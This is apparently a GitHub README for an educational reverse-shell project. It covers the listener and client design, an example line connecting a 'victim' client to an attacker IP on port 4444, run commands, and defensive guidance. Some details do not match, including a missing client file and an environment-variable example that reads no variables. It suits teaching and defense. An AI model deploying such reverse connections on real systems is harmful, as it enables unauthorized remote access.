<!-- Badges (replace with real links if desired) -->

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](#license)
[![Language: Python](https://img.shields.io/badge/Language-Python-green.svg)](#project-structure)
[![Status: Educational](https://img.shields.io/badge/Status-Educational-orange.svg)](#abstract)

# 🐍 Webixly Reverse Shell — Educational Cybersecurity Project

**Author:** Aymen (Webixly)
**Repository:** Webixly-Reverce
**License:** MIT (see `LICENSE`)

---

## 📚 Table of Contents

1. [Abstract](#abstract)
2. [Overview](#overview)
3. [Project Structure](#project-structure)
4. [Design & Implementation](#design--implementation)
5. [Configuration (CHANGE IP)](#configuration-change-ip)
6. [Usage (Lab / Controlled Environment Only)](#usage-lab--controlled-environment-only)
7. [Defensive Guidance](#defensive-guidance)
8. [Academic & Ethical Considerations](#academic--ethical-considerations)
9. [Contribution & Citation](#contribution--citation)
10. [License](#license)
11. [Contact](#contact)

---

## Abstract

This repository contains a safe, educational simulation of the *reverse shell* concept intended for academic use and cybersecurity instruction. The implementation demonstrates basic client–server network mechanics while intentionally limiting functionality to a small set of predefined, non-destructive commands. The objective is to help students and researchers understand reverse-connection patterns and to illustrate defensive practices to mitigate their misuse.

> ⚠️ **Warning:** This project is for authorized educational use only. Do **not** run or deploy these examples against systems or networks for which you do not have explicit permission. Unauthorized use is illegal and unethical.

---

## Overview

A *reverse shell* is a technique in which a target host initiates an outbound connection to an external listener, enabling command exchange over that channel. While used legitimately in penetration testing and red-team exercises, reverse shells are also abused by attackers. This repository models the connection pattern safely — the server executes only a whitelist of Python handlers (no arbitrary OS shell commands).

---

## Project Structure

```
.
├── LICENSE
├── README.md
├── listner.py             # Server-side command dispatcher (listener)
├── windows_reverce.py     # Example client for Windows (simulated)
├── linux_reverce.py       # Example client for Linux (simulated)
├── requirements.txt       # Optional dependencies (if any)
└── .gitignore
```

> 🔧 Adjust filenames above to match your repository if they differ.

---

## Design & Implementation

### Server (listener / `listner.py`)

* Listens for incoming TCP connections on a configurable address and port.
* Accepts JSON-formatted requests such as:

```json
{"token": "<auth-token>", "cmd": "time", "args": {}}
```

* Validates an authentication token (optional but recommended).
* Dispatches only to a predefined, safe set of handlers (e.g., `hello`, `time`, `sysinfo`).
* Uses newline-terminated JSON for message framing to avoid partial-read ambiguities.
* Logs events using a structured logger (recommended).

### Client (`windows_reverce.py`, `linux_reverce.py`, `client_example.py`)

* Establishes an outbound TCP connection to the configured listener.
* Sends framed JSON requests and reads framed JSON responses.
* Intended exclusively for demonstration in a controlled lab environment.

### Security Decisions

* **No arbitrary shell execution**: prevents the repository from becoming a fully functional remote shell.
* **Message framing & size checks**: prevent partial-read issues and limit resource consumption.
* **Optional TLS**: recommended for any use outside isolated labs (`ssl.wrap_socket` / `ssl.SSLContext`).
* **Authentication token**: recommended to prevent unauthorized access in multi-user networks.

---

## Configuration (CHANGE IP)

> 🔁 **Important:** Before running any client (victim) script, you **must** update the target listener IP address (`HOST`) and, if used, the `PORT`. Failure to set the correct listener IP will cause the client to attempt to connect to the wrong host.

Open the client script you intend to run (`windows_reverce.py`, `linux_reverce.py`, or `client_example.py`) and locate the `HOST`/`PORT` variables near the top of the file. Example:

```python
# windows_reverce.py (example snippet)
s.connect(("192.168.1.100", 4444))  <<==# Attacker's IP and Port 
```

**Steps**

1. Find the `HOST` variable and replace the placeholder with your listener/server IP (e.g., `192.168.10.128`).
2. Ensure `PORT` matches the port configured in `listner.py`.
3. Save the file and transfer it only to your controlled lab machine (if testing across VMs).

> 🔒 Tip: For lab automation, you can use environment variables instead of hardcoding:

```python
HOST = '192.168.10.128' # Attacker's IP address
PORT = 4444 # Attacker's listening port
```

This allows running:

```bash
REVERSE_HOST=192.168.10.128 REVERSE_PORT=4444 python3 windows_reverce.py
```

---

## Usage (Lab / Controlled Environment Only)

1. Create an isolated test environment (local VMs, isolated VLAN, or a single host with loopback testing).
2. Start the listener (on the host where `listner.py` runs):

```bash
python3 listner.py
```

3. On the test client machine (after updating `HOST` to point to the listener):

```bash

python3 windows_reverce.py
# or
python3 linux_reverce.py
```

> 🧪 Always operate within an environment you control. Do not run these scripts on production systems or public networks.

---

## Defensive Guidance

System administrators, students, and researchers should adopt the following controls to reduce the risk of reverse-shell exploitation:

* **Egress filtering:** restrict outbound connections by default; allow only required destinations and ports.
* **Host hardening:** enforce least privilege, disable interpreters where unnecessary, and use application allowlisting.
* **Network monitoring:** detect anomalous outbound connections (to uncommon ports or foreign hosts).
* **Endpoint detection:** use EDR/NDR solutions to identify process behaviors consistent with reverse shells.
* **Code review:** audit third-party and internal code for unsafe socket or subprocess usage.

---

## Academic & Ethical Considerations

This repository is intended for coursework, labs, and research under authorized conditions. Any unauthorized testing, scanning, or exploitation of systems you do not own or have permission to test is illegal. If you discover a vulnerability during legitimate testing, follow established responsible disclosure procedures.

---

## Contribution & Citation

Contributions that enhance the educational value (improved documentation, safe lab exercises, additional safe handlers) are welcome via issues or pull requests. If you cite this repository in academic work, please reference:

> A. (Aymen, Webixly), *Webixly Reverse Shell — Educational Cybersecurity Project*, GitHub repository, [https://github.com/webixly/Webixly-reverce](https://github.com/webixly/Webixly-reverce), 2025.

---

## License

This project is offered under the **MIT License**. See the `LICENSE` file for full terms.

---

## Contact

**Aymen (Webixly)**
GitHub: [https://github.com/webixly](https://github.com/webixly)
Email: [webiixly@gmail.com](mailto:webiixly@gmail.com)
